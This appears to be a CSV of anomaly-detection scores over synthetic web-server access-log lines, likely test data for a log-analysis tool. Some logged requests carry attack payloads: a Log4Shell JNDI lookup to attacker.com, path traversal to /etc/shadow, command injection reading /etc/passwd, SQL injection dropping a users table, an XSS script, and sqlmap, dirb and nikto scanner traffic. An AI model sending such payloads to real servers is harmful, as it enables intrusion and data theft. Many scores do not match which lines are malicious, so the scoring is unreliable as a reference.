score_content,score_session,score_fused,score_fused_norm,line
1.996323823928833,,1.996323823928833,1.996323823928833,234.121.194.138 - - [10/Jan/2025:12:04:56 +0000] "GET /profile HTTP/1.1" 200 18097 "https://www.google.com/" "sqlmap/1.5.10#stable"
2.069171667098999,,2.069171667098999,2.069171667098999,181.93.20.235 - - [10/Jan/2025:12:04:57 +0000] "GET /about HTTP/1.1" 200 17407 "-" "python-requests/2.31.0"
1.8680626153945923,,1.8680626153945923,1.8680626153945923,43.84.219.134 - - [10/Jan/2025:12:04:57 +0000] "GET /api/products HTTP/1.1" 200 5010 "-" "Wget/1.20.3 (linux-gnu)"
23.9760684967041,,23.9760684967041,23.9760684967041,115.208.15.117 - - [10/Jan/2025:12:05:02 +0000] "GET /search?q=headphones HTTP/1.1" 200 16823 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.3753436803817749,,0.3753436803817749,0.3753436803817749,186.6.102.66 - - [10/Jan/2025:12:05:05 +0000] "GET /index.html HTTP/1.1" 200 10198 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.754472017288208,,1.754472017288208,1.754472017288208,139.16.240.229 - - [10/Jan/2025:12:05:09 +0000] "GET /server-status HTTP/1.1" 200 2189 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.9785349369049072,,2.9785349369049072,2.9785349369049072,96.229.98.115 - - [10/Jan/2025:12:05:09 +0000] "GET /assets/app.js HTTP/1.1" 304 13874 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
0.2646361291408539,,0.2646361291408539,0.2646361291408539,31.46.138.101 - - [10/Jan/2025:12:05:09 +0000] "GET /assets/app.css HTTP/1.1" 204 11495 "https://www.google.com/" "python-requests/2.31.0"
4.887634754180908,,4.887634754180908,4.887634754180908,119.173.185.140 - - [10/Jan/2025:12:05:14 +0000] "GET / HTTP/1.1" 302 9876 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
24.029661178588867,,24.029661178588867,24.029661178588867,71.49.240.225 - - [10/Jan/2025:12:05:17 +0000] "GET /api/product?id=123 HTTP/1.1" 200 5183 "-" "sqlmap/1.5.10#stable"
24.03602409362793,,24.03602409362793,24.03602409362793,62.53.18.26 - - [10/Jan/2025:12:05:17 +0000] "GET /search?q=phone HTTP/1.1" 201 612 "-" "python-requests/2.31.0"
0.3437705934047699,,0.3437705934047699,0.3437705934047699,103.113.60.139 - - [10/Jan/2025:12:05:20 +0000] "GET /index.html HTTP/1.1" 200 1549 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.0353870391845703,,2.0353870391845703,2.0353870391845703,82.148.154.198 - - [10/Jan/2025:12:05:21 +0000] "GET /logout HTTP/1.1" 200 18977 "https://example.com/" "sqlmap/1.5.10#stable"
11036.5078125,,11036.5078125,11036.5078125,57.106.77.71 - - [10/Jan/2025:12:05:22 +0000] "GET /assets/app.css HTTP/1.1" 502 1067 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.30251801013946533,,0.30251801013946533,0.30251801013946533,143.127.13.249 - - [10/Jan/2025:12:05:26 +0000] "GET /assets/app.js HTTP/1.1" 201 14098 "https://news.ycombinator.com/" "curl/7.68.0"
24.05219841003418,,24.05219841003418,24.05219841003418,97.48.194.138 - - [10/Jan/2025:12:05:30 +0000] "GET /search?q=phone HTTP/1.1" 200 9926 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
2.9090678691864014,,2.9090678691864014,2.9090678691864014,144.106.248.107 - - [10/Jan/2025:12:05:31 +0000] "GET /assets/app.css HTTP/1.1" 304 1988 "https://twitter.com/" "python-requests/2.31.0"
2.0145490169525146,,2.0145490169525146,2.0145490169525146,237.116.217.95 - - [10/Jan/2025:12:05:32 +0000] "GET /login HTTP/1.1" 200 2690 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.4064324200153351,,0.4064324200153351,0.4064324200153351,155.11.224.19 - - [10/Jan/2025:12:05:37 +0000] "GET /index.html HTTP/1.1" 200 19923 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.8925793170928955,,1.8925793170928955,1.8925793170928955,78.245.233.4 - - [10/Jan/2025:12:05:42 +0000] "GET /api/products HTTP/1.1" 200 11010 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30147.736328125,,30147.736328125,30147.736328125,155.181.53.102 - - [10/Jan/2025:12:05:47 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 404 1424 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
24.036094665527344,,24.036094665527344,24.036094665527344,79.67.93.132 - - [10/Jan/2025:12:05:49 +0000] "GET /search?q=laptop HTTP/1.1" 200 11872 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
26.570697784423828,,26.570697784423828,26.570697784423828,235.53.95.81 - - [10/Jan/2025:12:05:49 +0000] "GET /search?q=headphones HTTP/1.1" 302 10593 "-" "Wget/1.20.3 (linux-gnu)"
0.29202917218208313,,0.29202917218208313,0.29202917218208313,240.150.149.185 - - [10/Jan/2025:12:05:53 +0000] "GET /assets/app.css HTTP/1.1" 200 18230 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
24.042194366455078,,24.042194366455078,24.042194366455078,128.141.168.242 - - [10/Jan/2025:12:05:54 +0000] "GET /api/product?id=123 HTTP/1.1" 200 8152 "https://example.com/" "sqlmap/1.5.10#stable"
11059.818359375,,11059.818359375,11059.818359375,190.126.118.44 - - [10/Jan/2025:12:05:56 +0000] "GET /search?q=headphones HTTP/1.1" 500 1314 "https://example.com/" "sqlmap/1.5.10#stable"
24.26991081237793,,24.26991081237793,24.26991081237793,254.165.246.16 - - [10/Jan/2025:12:05:57 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 17864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.035334348678589,,2.035334348678589,2.035334348678589,18.182.39.3 - - [10/Jan/2025:12:06:02 +0000] "GET /admin HTTP/1.1" 200 7683 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
23.932289123535156,,23.932289123535156,23.932289123535156,2.137.142.106 - - [10/Jan/2025:12:06:05 +0000] "GET /search?q=headphones HTTP/1.1" 204 615 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.0210654735565186,,2.0210654735565186,2.0210654735565186,207.241.233.46 - - [10/Jan/2025:12:06:09 +0000] "GET /logout HTTP/1.1" 200 14209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
23.874300003051758,,23.874300003051758,23.874300003051758,209.91.69.204 - - [10/Jan/2025:12:06:13 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 201 8371 "-" "dirb/2.22"
24.01939582824707,,24.01939582824707,24.01939582824707,77.176.212.218 - - [10/Jan/2025:12:06:15 +0000] "GET /search?q=camera HTTP/1.1" 200 7500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
23.998743057250977,,23.998743057250977,23.998743057250977,164.3.180.44 - - [10/Jan/2025:12:06:15 +0000] "GET /search?q=laptop HTTP/1.1" 200 1938 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.8734142780303955,,1.8734142780303955,1.8734142780303955,230.136.236.11 - - [10/Jan/2025:12:06:18 +0000] "GET /dashboard HTTP/1.1" 200 3224 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.923484802246094,,23.923484802246094,23.923484802246094,176.237.72.231 - - [10/Jan/2025:12:06:23 +0000] "GET /search?q=headphones HTTP/1.1" 200 2536 "https://twitter.com/" "python-requests/2.31.0"
24.028379440307617,,24.028379440307617,24.028379440307617,151.37.193.211 - - [10/Jan/2025:12:06:28 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 6888 "-" "dirb/2.22"
24.059606552124023,,24.059606552124023,24.059606552124023,174.230.139.85 - - [10/Jan/2025:12:06:30 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12851 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
1.9851741790771484,,1.9851741790771484,1.9851741790771484,60.215.20.88 - - [10/Jan/2025:12:06:35 +0000] "GET /profile HTTP/1.1" 200 14422 "https://twitter.com/" "python-requests/2.31.0"
1.8979400396347046,,1.8979400396347046,1.8979400396347046,201.116.126.59 - - [10/Jan/2025:12:06:39 +0000] "GET /dashboard HTTP/1.1" 200 9056 "https://twitter.com/" "curl/7.68.0"
24.028440475463867,,24.028440475463867,24.028440475463867,205.64.183.19 - - [10/Jan/2025:12:06:42 +0000] "GET /search?q=laptop HTTP/1.1" 200 9778 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.9013960361480713,,2.9013960361480713,2.9013960361480713,93.28.24.2 - - [10/Jan/2025:12:06:43 +0000] "GET /assets/app.css HTTP/1.1" 302 10476 "https://news.ycombinator.com/" "curl/7.68.0"
1.9543757438659668,,1.9543757438659668,1.9543757438659668,111.115.143.143 - - [10/Jan/2025:12:06:45 +0000] "GET /contact HTTP/1.1" 200 6240 "https://news.ycombinator.com/" "python-requests/2.31.0"
23.99785614013672,,23.99785614013672,23.99785614013672,154.201.84.222 - - [10/Jan/2025:12:06:45 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 19660 "-" "dirb/2.22"
4.699075222015381,,4.699075222015381,4.699075222015381,232.251.63.147 - - [10/Jan/2025:12:06:47 +0000] "GET /about HTTP/1.1" 302 18434 "https://www.google.com/" "python-requests/2.31.0"
0.2605951130390167,,0.2605951130390167,0.2605951130390167,127.38.17.43 - - [10/Jan/2025:12:06:52 +0000] "GET /assets/app.css HTTP/1.1" 200 8895 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
2.0373857021331787,,2.0373857021331787,2.0373857021331787,185.161.127.153 - - [10/Jan/2025:12:06:55 +0000] "GET /about HTTP/1.1" 200 8180 "https://www.google.com/" "python-requests/2.31.0"
24.060333251953125,,24.060333251953125,24.060333251953125,86.216.159.98 - - [10/Jan/2025:12:06:58 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 13066 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.2965956926345825,,0.2965956926345825,0.2965956926345825,243.178.52.123 - - [10/Jan/2025:12:07:00 +0000] "GET /assets/app.css HTTP/1.1" 200 19866 "https://www.google.com/" "curl/7.68.0"
4.6543869972229,,4.6543869972229,4.6543869972229,248.148.201.63 - - [10/Jan/2025:12:07:03 +0000] "GET /logout HTTP/1.1" 302 16189 "https://news.ycombinator.com/" "curl/7.68.0"
24.057098388671875,,24.057098388671875,24.057098388671875,52.152.140.47 - - [10/Jan/2025:12:07:05 +0000] "GET /search?q=laptop HTTP/1.1" 200 18576 "https://twitter.com/" "sqlmap/1.5.10#stable"
30148.6328125,,30148.6328125,30148.6328125,113.205.75.213 - - [10/Jan/2025:12:07:05 +0000] "GET /search?q=camera HTTP/1.1" 429 429 "-" "sqlmap/1.5.10#stable"
0.2553093135356903,,0.2553093135356903,0.2553093135356903,65.169.40.184 - - [10/Jan/2025:12:07:08 +0000] "GET /assets/app.css HTTP/1.1" 201 8030 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
23.978368759155273,,23.978368759155273,23.978368759155273,130.237.236.223 - - [10/Jan/2025:12:07:08 +0000] "GET /search?q=headphones HTTP/1.1" 200 17610 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
26.587018966674805,,26.587018966674805,26.587018966674805,153.164.235.22 - - [10/Jan/2025:12:07:12 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 301 17693 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.2531276047229767,,0.2531276047229767,0.2531276047229767,145.252.166.174 - - [10/Jan/2025:12:07:17 +0000] "GET /assets/app.js HTTP/1.1" 204 1551 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
24.02509307861328,,24.02509307861328,24.02509307861328,67.57.131.192 - - [10/Jan/2025:12:07:19 +0000] "GET /search?q=phone HTTP/1.1" 200 3331 "https://twitter.com/" "python-requests/2.31.0"
24.05982780456543,,24.05982780456543,24.05982780456543,119.198.174.151 - - [10/Jan/2025:12:07:23 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12916 "https://twitter.com/" "sqlmap/1.5.10#stable"
2.260206460952759,,2.260206460952759,2.260206460952759,107.236.247.22 - - [10/Jan/2025:12:07:24 +0000] "GET / HTTP/1.1" 200 9780 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
26.7066593170166,,26.7066593170166,26.7066593170166,124.90.122.25 - - [10/Jan/2025:12:07:26 +0000] "GET /search?q=camera HTTP/1.1" 304 17175 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
2.965996742248535,,2.965996742248535,2.965996742248535,6.218.88.166 - - [10/Jan/2025:12:07:28 +0000] "GET /wp-login.php HTTP/1.1" 304 3871 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.2933506667613983,,0.2933506667613983,0.2933506667613983,144.110.246.119 - - [10/Jan/2025:12:07:33 +0000] "GET /assets/app.js HTTP/1.1" 200 10945 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.038671493530273,,24.038671493530273,24.038671493530273,116.152.110.100 - - [10/Jan/2025:12:07:38 +0000] "GET /search?q=phone HTTP/1.1" 200 6565 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.069999933242798,,2.069999933242798,2.069999933242798,48.94.84.51 - - [10/Jan/2025:12:07:39 +0000] "GET /about HTTP/1.1" 200 17692 "-" "Wget/1.20.3 (linux-gnu)"
23.954687118530273,,23.954687118530273,23.954687118530273,153.100.157.101 - - [10/Jan/2025:12:07:41 +0000] "GET /search?q=headphones HTTP/1.1" 200 10369 "-" "python-requests/2.31.0"
24.026782989501953,,24.026782989501953,24.026782989501953,236.158.152.22 - - [10/Jan/2025:12:07:43 +0000] "GET /search?q=camera HTTP/1.1" 201 9846 "https://www.google.com/" "sqlmap/1.5.10#stable"
24.057830810546875,,24.057830810546875,24.057830810546875,178.37.131.100 - - [10/Jan/2025:12:07:45 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 12332 "https://twitter.com/" "dirb/2.22"
24.07782745361328,,24.07782745361328,24.07782745361328,178.236.166.239 - - [10/Jan/2025:12:07:46 +0000] "GET /search?q=phone HTTP/1.1" 200 17708 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.28191491961479187,,0.28191491961479187,0.28191491961479187,159.14.222.92 - - [10/Jan/2025:12:07:47 +0000] "GET /assets/app.css HTTP/1.1" 200 14878 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11059.8974609375,,11059.8974609375,11059.8974609375,168.127.105.176 - - [10/Jan/2025:12:07:48 +0000] "GET /search?q=laptop HTTP/1.1" 500 1035 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
23.981260299682617,,23.981260299682617,23.981260299682617,8.204.195.57 - - [10/Jan/2025:12:07:53 +0000] "GET /search?q=headphones HTTP/1.1" 200 18626 "-" "curl/7.68.0"
2.023866891860962,,2.023866891860962,2.023866891860962,145.191.198.197 - - [10/Jan/2025:12:07:55 +0000] "GET /logout HTTP/1.1" 200 15085 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
0.3708075284957886,,0.3708075284957886,0.3708075284957886,211.254.94.139 - - [10/Jan/2025:12:07:59 +0000] "GET /.git/config HTTP/1.1" 200 17896 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.045501708984375,,24.045501708984375,24.045501708984375,77.224.9.116 - - [10/Jan/2025:12:08:03 +0000] "GET /search?q=phone HTTP/1.1" 200 8211 "https://example.com/" "curl/7.68.0"
4.629238128662109,,4.629238128662109,4.629238128662109,54.208.189.151 - - [10/Jan/2025:12:08:03 +0000] "GET /contact HTTP/1.1" 304 7864 "https://example.com/" "sqlmap/1.5.10#stable"
24.030481338500977,,24.030481338500977,24.030481338500977,201.53.209.53 - - [10/Jan/2025:12:08:08 +0000] "GET /search?q=phone HTTP/1.1" 200 4662 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2886113226413727,,0.2886113226413727,0.2886113226413727,75.147.69.244 - - [10/Jan/2025:12:08:10 +0000] "GET /assets/app.js HTTP/1.1" 200 9689 "-" "python-requests/2.31.0"
30147.57421875,,30147.57421875,30147.57421875,222.168.33.180 - - [10/Jan/2025:12:08:11 +0000] "GET /search?q=phone HTTP/1.1" 404 567 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
26.671886444091797,,26.671886444091797,26.671886444091797,126.37.148.162 - - [10/Jan/2025:12:08:12 +0000] "GET /api/product?id=123 HTTP/1.1" 302 12968 "https://news.ycombinator.com/" "curl/7.68.0"
2.041533946990967,,2.041533946990967,2.041533946990967,178.240.225.95 - - [10/Jan/2025:12:08:15 +0000] "GET /about HTTP/1.1" 200 9216 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
4.689323902130127,,4.689323902130127,4.689323902130127,163.171.179.92 - - [10/Jan/2025:12:08:17 +0000] "GET /about HTTP/1.1" 302 15122 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30147.392578125,,30147.392578125,30147.392578125,69.83.213.73 - - [10/Jan/2025:12:08:20 +0000] "GET /search?q=phone HTTP/1.1" 400 1013 "https://twitter.com/" "curl/7.68.0"
26.879119873046875,,26.879119873046875,26.879119873046875,12.26.161.201 - - [10/Jan/2025:12:08:24 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 304 1686 "-" "nikto/2.5.0"
0.3465839624404907,,0.3465839624404907,0.3465839624404907,254.246.110.52 - - [10/Jan/2025:12:08:24 +0000] "GET /assets/app.js HTTP/1.1" 200 122 "https://www.google.com/" "sqlmap/1.5.10#stable"
2.051548719406128,,2.051548719406128,2.051548719406128,65.22.96.171 - - [10/Jan/2025:12:08:29 +0000] "GET /login HTTP/1.1" 200 11910 "https://www.google.com/" "sqlmap/1.5.10#stable"
4.625027179718018,,4.625027179718018,4.625027179718018,110.168.24.181 - - [10/Jan/2025:12:08:29 +0000] "GET /logout HTTP/1.1" 302 7772 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2888026237487793,,0.2888026237487793,0.2888026237487793,175.114.3.3 - - [10/Jan/2025:12:08:30 +0000] "GET /assets/app.css HTTP/1.1" 200 17121 "https://example.com/" "sqlmap/1.5.10#stable"
26.665586471557617,,26.665586471557617,26.665586471557617,19.59.99.23 - - [10/Jan/2025:12:08:30 +0000] "GET /search?q=phone HTTP/1.1" 301 15753 "-" "sqlmap/1.5.10#stable"
1.983132243156433,,1.983132243156433,1.983132243156433,165.174.37.18 - - [10/Jan/2025:12:08:30 +0000] "GET /logout HTTP/1.1" 200 4462 "https://twitter.com/" "python-requests/2.31.0"
0.2780038118362427,,0.2780038118362427,0.2780038118362427,161.192.39.236 - - [10/Jan/2025:12:08:30 +0000] "GET /assets/app.js HTTP/1.1" 200 7081 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
1.8612178564071655,,1.8612178564071655,1.8612178564071655,36.193.32.151 - - [10/Jan/2025:12:08:35 +0000] "GET /api/products HTTP/1.1" 200 3392 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
4.562707901000977,,4.562707901000977,4.562707901000977,71.166.22.64 - - [10/Jan/2025:12:08:37 +0000] "GET /dashboard HTTP/1.1" 304 8219 "https://twitter.com/" "python-requests/2.31.0"
4.649920463562012,,4.649920463562012,4.649920463562012,218.217.169.225 - - [10/Jan/2025:12:08:41 +0000] "GET /logout HTTP/1.1" 304 978 "https://www.google.com/" "curl/7.68.0"
4.516406059265137,,4.516406059265137,4.516406059265137,166.14.201.230 - - [10/Jan/2025:12:08:45 +0000] "GET /api/products HTTP/1.1" 302 9784 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.21210289001465,,24.21210289001465,24.21210289001465,136.228.251.4 - - [10/Jan/2025:12:08:48 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 201 2426 "https://example.com/" "sqlmap/1.5.10#stable"
24.03522300720215,,24.03522300720215,24.03522300720215,196.121.245.253 - - [10/Jan/2025:12:08:49 +0000] "GET /search?q=phone HTTP/1.1" 200 5761 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.179445266723633,,24.179445266723633,24.179445266723633,243.203.102.130 - - [10/Jan/2025:12:08:53 +0000] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 2081 "https://twitter.com/" "python-requests/2.31.0"
24.05455207824707,,24.05455207824707,24.05455207824707,138.158.40.72 - - [10/Jan/2025:12:08:56 +0000] "GET /search?q=laptop HTTP/1.1" 200 17682 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11038.0498046875,,11038.0498046875,11038.0498046875,138.84.101.151 - - [10/Jan/2025:12:08:56 +0000] "GET /api/products HTTP/1.1" 500 318 "-" "sqlmap/1.5.10#stable"
24.020647048950195,,24.020647048950195,24.020647048950195,237.112.30.117 - - [10/Jan/2025:12:08:58 +0000] "GET /api/product?id=123 HTTP/1.1" 200 2925 "https://twitter.com/" "python-requests/2.31.0"
0.26712700724601746,,0.26712700724601746,0.26712700724601746,180.3.42.128 - - [10/Jan/2025:12:08:58 +0000] "GET /assets/app.js HTTP/1.1" 200 4596 "https://twitter.com/" "curl/7.68.0"
2.020501136779785,,2.020501136779785,2.020501136779785,192.200.224.69 - - [10/Jan/2025:12:09:02 +0000] "GET /login HTTP/1.1" 200 4259 "-" "sqlmap/1.5.10#stable"
24.022056579589844,,24.022056579589844,24.022056579589844,68.183.250.148 - - [10/Jan/2025:12:09:02 +0000] "GET /search?q=phone HTTP/1.1" 200 2192 "-" "sqlmap/1.5.10#stable"
1.9979625940322876,,1.9979625940322876,1.9979625940322876,43.95.41.66 - - [10/Jan/2025:12:09:05 +0000] "GET /profile HTTP/1.1" 200 18675 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
26.703161239624023,,26.703161239624023,26.703161239624023,12.220.221.4 - - [10/Jan/2025:12:09:10 +0000] "GET /api/product?id=123 HTTP/1.1" 302 184 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.23563124239444733,,0.23563124239444733,0.23563124239444733,142.206.234.183 - - [10/Jan/2025:12:09:13 +0000] "GET /assets/app.css HTTP/1.1" 200 1258 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
30147.5703125,,30147.5703125,30147.5703125,70.212.20.147 - - [10/Jan/2025:12:09:14 +0000] "GET /search?q=phone HTTP/1.1" 404 655 "-" "curl/7.68.0"
0.39812564849853516,,0.39812564849853516,0.39812564849853516,252.12.245.103 - - [10/Jan/2025:12:09:18 +0000] "GET /index.html HTTP/1.1" 200 17000 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.0332632064819336,,2.0332632064819336,2.0332632064819336,117.3.95.52 - - [10/Jan/2025:12:09:20 +0000] "GET /logout HTTP/1.1" 200 18223 "https://twitter.com/" "curl/7.68.0"
24.07975959777832,,24.07975959777832,24.07975959777832,249.127.198.199 - - [10/Jan/2025:12:09:22 +0000] "GET /api/product?id=123 HTTP/1.1" 200 19488 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.078218460083008,,24.078218460083008,24.078218460083008,89.163.215.178 - - [10/Jan/2025:12:09:23 +0000] "GET /search?q=phone HTTP/1.1" 200 17845 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30147.40625,,30147.40625,30147.40625,79.27.53.136 - - [10/Jan/2025:12:09:23 +0000] "GET /search?q=laptop HTTP/1.1" 401 1489 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.8713395595550537,,2.8713395595550537,2.8713395595550537,12.236.60.230 - - [10/Jan/2025:12:09:26 +0000] "GET /assets/app.css HTTP/1.1" 302 3148 "https://news.ycombinator.com/" "python-requests/2.31.0"
11059.9833984375,,11059.9833984375,11059.9833984375,149.25.130.35 - - [10/Jan/2025:12:09:31 +0000] "GET /search?q=camera HTTP/1.1" 500 173 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.35099080204963684,,0.35099080204963684,0.35099080204963684,61.75.67.218 - - [10/Jan/2025:12:09:31 +0000] "GET /index.html HTTP/1.1" 200 4383 "https://news.ycombinator.com/" "curl/7.68.0"
1.897762417793274,,1.897762417793274,1.897762417793274,60.20.242.52 - - [10/Jan/2025:12:09:36 +0000] "GET /dashboard HTTP/1.1" 200 9011 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
